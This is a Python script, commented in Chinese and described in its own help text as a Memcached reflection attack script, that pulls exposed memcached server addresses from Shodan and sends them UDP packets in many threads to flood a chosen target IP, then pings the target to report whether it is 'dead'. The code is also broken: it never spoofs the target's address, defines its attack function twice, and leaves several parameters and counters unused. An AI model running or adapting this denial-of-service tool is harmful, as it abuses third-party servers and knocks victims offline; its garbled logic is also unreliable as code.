import shodan
import argparse
import socket
import threading
import time
import subprocess


# 初始化 Shodan API
api_key = "YOUR_API_KEY"
api = shodan.Shodan(api_key)

# 搜索 Memcached 服务器
results = api.search("memcached")

# 提取服务器 IP 地址
memcached_ips = []
for result in results["matches"]:
    ip = result["ip_str"]
    memcached_ips.append(ip)

# 定义攻击函数
def attack(target_ip, target_port, reflection_ip, reflection_port, amplification_factor):
    # 创建 UDP 套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.5)

    # 构造攻击数据包
    attack_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    attack_packet = attack_payload.encode("utf-8")

    # 发送攻击数据包
    while True:
        try:
            sock.sendto(attack_packet, (reflection_ip, reflection_port))
            data, _ = sock.recvfrom(1024)
            if "STAT version" in data.decode("utf-8"):
                print("[+] Reflection detected from %s" % reflection_ip)
                break
        except:
            pass

    # 构造反射数据包
    reflection_payload = "\x00\x00\x00\x00\x00\x01\x00\x00get %s\r\n" % target_ip
    reflection_packet = reflection_payload.encode("utf-8")

    # 发送反射数据包
    while True:
        try:
            sock.sendto(reflection_packet, (reflection_ip, reflection_port))
            data, _ = sock.recvfrom(1024)
            if "VALUE" in data.decode("utf-8"):
                print("[+] Reflection success from %s" % reflection_ip)
                break
        except:
            pass

    # 关闭套接字
    sock.close()

# 解析命令行参数
parser = argparse.ArgumentParser(description="Memcached反射攻击脚本")
parser.add_argument("target_ip", help="目标网站服务器的IP地址")
parser.add_argument("target_port", type=int, help="目标网站服务器的端口号")
parser.add_argument("threads", type=int, help="攻击使用的线程数")
parser.add_argument("duration", type=int, help="攻击持续时间（秒）")
parser.add_argument("amplification_factor", type=int, help="反射放大倍数")
args = parser.parse_args()

# 打印服务器列表
print("Memcached 服务器列表：")
for ip in memcached_ips:
    print(ip)

# 构造攻击参数
target_ip = args.target_ip
target_port = args.target_port
reflection_port = 11211
threads = args.threads
duration = args.duration
amplification_factor = args.amplification_factor

# 启动攻击线程
for i in range(threads):
    t = threading.Thread(target=attack, args=(target_ip, target_port, memcached_ips[i % len(memcached_ips)], reflection_port, amplification_factor))
    t.start()

# 等待攻击结束
time.sleep(duration)

# 停止攻击线程
for i in range(threads):
    t.join()

def attack(target_ip, target_port, reflection_ip, reflection_port, amplification_factor):
    # 创建 UDP 套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.5)

    # 构造攻击数据包
    attack_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    attack_packet = attack_payload.encode("utf-8")

    # 发送攻击数据包
    start_time = time.time()
    attack_size = 0
    reflection_size = 0
    while True:
        try:
            sock.sendto(attack_packet, (reflection_ip, reflection_port))
            data, _ = sock.recvfrom(1024)
            if "STAT version" in data.decode("utf-8"):
                print("[+] Reflection detected from %s" % reflection_ip)
                break
        except:
            pass

    # 构造反射数据包
    reflection_payload = "\x00\x00\x00\x00\x00\x01\x00\x00get %s\r\n" % target_ip
    reflection_packet = reflection_payload.encode("utf-8")

    # 发送反射数据包
    while True:
        try:
            sock.sendto(reflection_packet, (reflection_ip, reflection_port))
            data, _ = sock.recvfrom(1024)
            if "VALUE" in data.decode("utf-8"):
                print("[+] Reflection success from %s" % reflection_ip)
                break
        except:
            pass

    # 关闭套接字
    sock.close()

    # 检测目标IP是否死亡
    ping_result = subprocess.call(["ping", "-c", "1", target_ip])
    if ping_result == 0:
        print("[+] Target IP is alive")
    else:
        print("[-] Target IP is dead")

    # 打印攻击数据
    end_time = time.time()
    attack_time = end_time - start_time
    print("[+] Attack time: %.2f seconds" % attack_time)
    print("[+] Attack size: %d bytes" % attack_size)
    print("[+] Reflection size: %d bytes" % reflection_size)
